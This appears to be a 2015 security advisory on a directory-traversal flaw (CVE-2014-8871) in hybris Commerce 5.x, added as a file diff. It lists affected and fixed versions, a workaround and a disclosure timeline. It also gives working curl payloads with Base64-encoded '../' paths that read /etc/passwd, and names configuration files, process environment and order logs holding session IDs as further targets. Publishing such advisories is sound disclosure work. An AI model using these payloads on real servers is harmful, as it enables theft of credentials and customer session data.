@@ -1,0 +1,177 @@
+id: 23305
+date: 02/18/2015
+title: Hybris Commerce Software Suite 5.x File Disclosure / Traversal Vulnerabilities
+author: RedTeam
+cves: CVE-2014-8871
+
+Directory Traversal and Arbitrary File Disclosure in hybris
+          Commerce Software Suite
+
+During a penetration test, RedTeam Pentesting discovered a Directory
+Traversal vulnerability in hybris Commerce software suite. This
+vulnerability allows attackers to download arbitrary files of any size
+from the affected system.
+
+
+Details
+=======
+
+Product: hybris Commerce Software Suite
+Affected Versions:
+  Release 5.3:   <= 5.3.0.1
+  Release 5.2:   <= 5.2.0.3
+  Release 5.1.1: <= 5.1.1.2
+  Release 5.1:   <= 5.1.0.1
+  Release 5.0.4: <= 5.0.4.4
+  Release 5.0.3: <= 5.0.3.3
+  Release 5.0.0: <= 5.0.0.3
+Fixed Versions:
+  Release 5.3:      5.3.0.2
+  Release 5.2:      5.2.0.4
+  Release 5.1.1:    5.1.1.3
+  Release 5.1:      5.1.0.2
+  Release 5.0.4:    5.0.4.5
+  Release 5.0.3:    5.0.3.4
+  Release 5.0.0:    5.0.0.4
+Vulnerability Type: Directory Traversal, Arbitrary File Disclosure
+Security Risk: high
+Vendor URL: http://www.hybris.com/
+Vendor Status: fixed version released
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2014-016
+Advisory Status: published
+CVE: CVE-2014-8871
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8871
+
+
+Introduction
+============
+
+"hybris delivers a commerce software suite that is best in class,
+helping a company execute all its direct selling processes and present a
+single view and a unified experience to all its customers."
+
+(from the vendor's homepage)
+
+
+More Details
+============
+
+Webshops based on hybris may use an image retrieval system where images
+are identified by a URL parameter named "context" rather than a file
+name. When this system is used, images can be referenced e.g. like the
+following:
+
+<img src="/medias/image.jpg?context=bWFzdGVyfHJvb3R8MTIzNDV8aW1hZ2UvanBl
+Z3w3NDE1Njg3MzYxMTcyLmpwZ3xlM2IwYzQ0Mjk4ZmMxYzE0OWFmYmY0Yzg5OTZmYjkyNDI3
+YWU0MWU0NjQ5YjkzNGNhNDk1OTkxYjc4NTJiODU1" alt="[...]" width="200" />
+
+Changing the file name part of the URL from "image.jpg" to e.g.
+"redteam.jpg" reveals that not the file name part of the URL, but the
+value of the parameter "context" is used to select the desired file.
+
+A closer look at the parameter shows that its value is encoded as
+Base64. Decoding it reveals a pipe-separated data structure which
+includes a file size (third value), a file name (fifth value) and a
+SHA-256 hash (sixth value):
+
+$ echo -n "bWFzdGVyfHJvb3R8MTIzNDV8aW1hZ2UvanBlZ3w3NDE1Njg3MzYxMTcyLmpw\
+Z3xlM2IwYzQ0Mjk4ZmMxYzE0OWFmYmY0Yzg5OTZmYjkyNDI3YWU0MWU0NjQ5YjkzNGNhNDk\
+1OTkxYjc4NTJiODU1" | base64 -d
+
+master|root|12345|image/jpeg|7415687361172.jpg|e3b0c44298fc1c149afbf4c89
+96fb92427ae41e4649b934ca495991b7852b855
+
+During the penetration test many parameters were inspected and it turned
+out that the SHA-256 hash is used to reference a particular version of
+the file, and can be replaced by a dash ("-") character, which always
+returns the latest version. The example request can be modified and
+requested with curl as follows:
+
+$ echo -n "master|root|12345|image/jpeg|7415687361172.jpg|-" | base64
+bWFzdGVyfHJvb3R8MTIzNDV8aW1hZ2UvanBlZ3w3NDE1Njg3MzYxMTcyLmpwZ3wt
+$ curl -I http://www.example.com/medias/redteam?context=bWFzdGVyfHJvb3R\
+8MTIzNDV8aW1hZ2UvanBlZ3w3NDE1Njg3MzYxMTcyLmpwZ3wt
+
+It was verified that the file name (fifth) value is vulnerable to
+directory traversal. This enables attackers to retrieve the contents of
+other files from the server's filesystem by using sequences of "../".
+The following HTTP request for example delivers the contents of the file
+"/etc/passwd":
+
+$ echo -n "master|root|12345|text/plain|../../../../../../etc/passwd|-"\
+  | base64 -w0
+bWFzdGVyfHJvb3R8MTIzNDV8dGV4dC9wbGFpbnwuLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFz
+c3dkfC0=
+
+$ curl http://www.example.com/medias/redteam?context=bWFzdGVyfHJvb3R8MT\
+IzNDV8dGV4dC9wbGFpbnwuLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkfC0
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+[...]
+
+The size included in the third field of the data structure is used to
+limit the number of bytes returned for a file. As it can be modified by
+attackers, files of any size with arbitrary content can be downloaded,
+provided the path to the file on the server is known. This enables
+attackers to read, among others, the environment of the current process
+at /proc/self/environ and the list of memory maps including the full
+paths to loaded libraries at /proc/self/maps. This way, knowledge about
+a particular instance of hybris can be gathered. Afterwards it is
+possible to access configuration files like "local.properties" and the
+log files for shop orders which also contain the current session-IDs of
+users. Furthermore, the Java bytecode of hybris can be downloaded and
+decompiled.
+
+
+Proof of Concept
+================
+
+------------------------------------------------------------------------
+FILENAME=/etc/passwd
+curl https://www.example.com/medias/redteam?context=$(base64 -w0 <<< \
+"master|root|200000000|text/plain|../../../../../..${FILENAME}|-")
+------------------------------------------------------------------------
+
+
+Workaround
+==========
+
+Implement a new filter which validates file names and insert this filter
+before hybris' own MediaFilter. The new filter should return an error
+when a file outside the media directory is requested.
+
+
+Fix
+===
+
+Upgrade to a fixed hybris version or apply the vendor's hot fix.
+
+
+Security Risk
+=============
+
+This vulnerability can be used to download files from the file system of
+the server. This includes, among others, configuration files and the
+hybris order logfile, which contains sensitive data. Therefore, the
+vulnerability poses a high risk.
+
+
+Timeline
+========
+
+2014-10-08 Vulnerability identified
+2014-10-08 Customer notified vendor
+2014-10-29 Vendor released fixed version
+2014-11-11 CVE number requested
+2014-11-12 Vendor requests more time to notify their customers
+2014-11-14 CVE number assigned
+2014-12-08 Vendor again requests more time to notify customers
+2015-01-12 Vendor notifies customers again, agrees to release advisory
+           on 2015-02-18
+2015-02-17 Vendor requests more time to notify customers for the 3rd
+           time, RedTeam Pentesting declines
+2015-02-18 Advisory released
+
+#  0day.today [2023-03-25]  #
